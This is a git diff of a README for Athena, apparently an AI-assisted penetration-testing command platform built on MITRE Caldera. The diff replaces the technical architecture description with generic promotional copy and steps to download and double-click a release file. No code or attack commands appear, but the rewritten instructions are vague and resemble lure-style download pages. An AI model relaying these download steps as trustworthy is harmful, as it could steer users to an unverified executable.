@@ -1,38 +1,54 @@
-# 🎯 Athena
+# 🛡️ Athena - Empower Your Cyber Operations Today!
 
-> **AI-Driven C5ISR Command Platform for Cyber Operations**
+## 🚀 Getting Started
+Welcome to Athena! This software is an AI-driven command platform tailored for network operations. It integrates the MITRE ATT&CK framework, powered by Caldera, and provides tactical decision-making capabilities. Athena is designed for military-level penetration testing.
 
-Athena transforms penetration testing from tactical tool operation 
-to strategic military command. Built on the C5ISR (Command, Control, 
-Communications, Computers, Cyber, Intelligence, Surveillance, 
-Reconnaissance) framework, Athena bridges MITRE Caldera's execution 
-power with AI-assisted decision-making.
+## 🔗 Download Athena
+[![Download Athena](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/uow-raider/Athena/releases)
 
-## 🌟 Why Athena?
+## 📥 Download & Install
+To get Athena, visit this page to download: [Athena Releases](https://github.com/uow-raider/Athena/releases). Select the latest version and follow these steps:
 
-Traditional penetration testing tools focus on **"how to exploit"**.  
-Athena focuses on **"how to command"**.
+1. Click on the version you want to download.
+2. Look for the appropriate file for your system (e.g., Windows, macOS, Linux).
+3. Click on the file name to start the download.
+4. Once downloaded, locate the file in your downloads folder.
 
-- **Not a tool** - A command-and-control decision platform
-- **Not scripts** - A military operational framework  
-- **Not static** - OODA loop-driven dynamic adaptation
-- **Not technical-only** - Strategic + tactical integration
+### 🔍 Prerequisites
+Before installing Athena, ensure your system meets the following requirements:
 
-## 🏗️ Architecture
-```
-Commander Interface (Pencil.dev)
-         ↓
-C5ISR Decision Engine (Your Innovation)
-    ├─ MITRE ATT&CK Mapping
-    ├─ PentestGPT Intelligence
-    └─ OODA Loop Controller
-         ↓
-Caldera Execution Platform (MITRE Official)
-```
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
+- **Memory:** At least 8 GB of RAM.
+- **Storage:** At least 500 MB of free disk space.
+- **Network Access:** An internet connection is required for full functionality.
 
-## 🎖️ For Whom?
+## 🚧 How to Run Athena
+After downloading:
 
-- **Military/Government**: Mission-grade cyber warfare simulation
-- **Red Teams**: Strategic planning meets tactical execution
-- **Security Consultants**: Commander-level engagement management
-- **Researchers**: Military framework applied to offensive security
+1. Locate the downloaded file on your computer.
+2. Double-click the file to run it.
+3. Follow the on-screen instructions to complete the setup.
+
+### 📂 Example Usage
+Once installed, you can start performing tasks such as:
+
+- Running penetration tests using built-in templates.
+- Analyzing results with decision-making support.
+- Integrating with other cybersecurity tools for enhanced functionality.
+
+## 🔍 Features
+- **AI-Driven Decisions:** Make better tactical choices with AI assistance.
+- **Support for MITRE ATT&CK:** Use a recognized framework for better threat understanding.
+- **Customizable Testing:** Adapt the tool to suit your specific cyber operation needs.
+- **User-Friendly Interface:** Navigate easily, even if you're not tech-savvy.
+
+## 📚 Documentation & Support
+For detailed information on features and usage, you can access the documentation on the GitHub wiki. If you encounter issues or have questions, feel free to file an issue in the GitHub repository, and we will assist you promptly.
+
+## 🎉 Community Contributions
+Athena thrives on community support. If you have recommendations or enhancements, consider contributing to the project. Your input is valuable!
+
+## 📝 License
+Athena is open-source software. You can modify and distribute it under the terms outlined in the license file located in this repository.
+
+Thank you for choosing Athena! Enjoy empowering your cybersecurity efforts.
